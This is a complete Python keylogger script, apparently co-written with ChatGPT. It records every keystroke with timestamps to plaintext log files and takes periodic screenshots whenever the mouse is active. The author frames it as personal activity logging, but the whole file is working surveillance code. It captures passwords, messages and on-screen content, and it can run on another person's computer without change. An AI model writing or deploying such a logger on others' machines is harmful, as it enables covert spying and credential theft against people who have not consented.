# Keylogger ChatGPT and I wrote so I can play with the data later.

import os
import time
import threading
import datetime
from pynput import keyboard
from pynput.mouse import Listener as MouseListener
import pyautogui

class Keylogger:
    def __init__(self, logs_dir="KeyloggerLogs"):
        # Initialize the keylogger with the specified logs directory
        self.logs_dir = logs_dir
        self.log_file = ""
        self.screenshot_interval = 180  # Screenshot interval: 3 minutes in seconds
        self.initialize_logger()
        self.start_keylogger()
        self.start_log_checker()
        self.start_screenshot_capture()

    def initialize_logger(self):
        try:
            # Ensure the logs directory exists; create if not
            if not os.path.exists(self.logs_dir):
                os.makedirs(self.logs_dir)
            # Create a new log file for the current date
            self.create_new_log_file()
        except Exception as e:
            self.log_error(f"Error initializing logger: {e}")

    def create_new_log_file(self):
        try:
            # Generate a log file name based on the current date
            current_date = datetime.datetime.now().strftime("%Y-%m-%d")
            self.log_file = os.path.join(self.logs_dir, f"{current_date}.txt")
        except Exception as e:
            self.log_error(f"Error creating a new log file: {e}")

    def log_error(self, message):
        try:
            # Log errors to a dedicated error log file with timestamps
            error_log_file = os.path.join(self.logs_dir, "error_log.txt")
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            with open(error_log_file, "a") as file:
                file.write(f"[{timestamp}] {message}\n")
        except Exception as e:
            # Handle any errors while logging errors (meta-error handling)
            print(f"Meta-error: {e}")

    def on_mouse_move(self, x, y):
        # Track mouse movements to detect activity
        self.last_mouse_activity = time.time()

    def start_screenshot_capture(self):
        # Initialize mouse activity tracking
        self.last_mouse_activity = time.time()
        # Start listening to mouse movements
        mouse_listener = MouseListener(on_move=self.on_mouse_move)
        mouse_listener.start()
        while True:
            current_time = time.time()
            # Check if mouse or keyboard activity occurred within the interval
            if current_time - self.last_mouse_activity <= self.screenshot_interval:
                # Capture a screenshot with a timestamp
                screenshot_filename = os.path.join(self.logs_dir, f"screenshot_{int(current_time)}.png")
                pyautogui.screenshot(screenshot_filename)
            time.sleep(self.screenshot_interval)

    def on_key_press(self, key):
        # Log the key press
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(self.log_file, "a") as file:
            file.write(f"[{timestamp}] Key pressed: {key}\n")

    def start_keylogger(self):
        # Start the keylogger
        self.key_listener = keyboard.Listener(on_press=self.on_key_press)
        self.key_listener.start()
            
    def start_log_checker(self):
        # Start the log checker in a separate thread
        log_checker_thread = threading.Thread(target=self.log_checker)
        log_checker_thread.start()
    
    def log_checker(self):
        # Log checker method to be run in a separate thread
        while True:
            try:
                with open(self.log_file, "r") as file:
                    logs = file.read()
                # Do something with the logs
            except FileNotFoundError:
                # Log file not found, create a new one
                self.create_new_log_file()
            time.sleep(60)  # Check the log file every minute  

if __name__ == "__main__":
    try:
        # Start the keylogger by initializing an instance of the Keylogger class
        keylogger = Keylogger()
    except Exception as e:
        # Handle any initialization errors and print a user-friendly message
        print(f"Error: {e}")

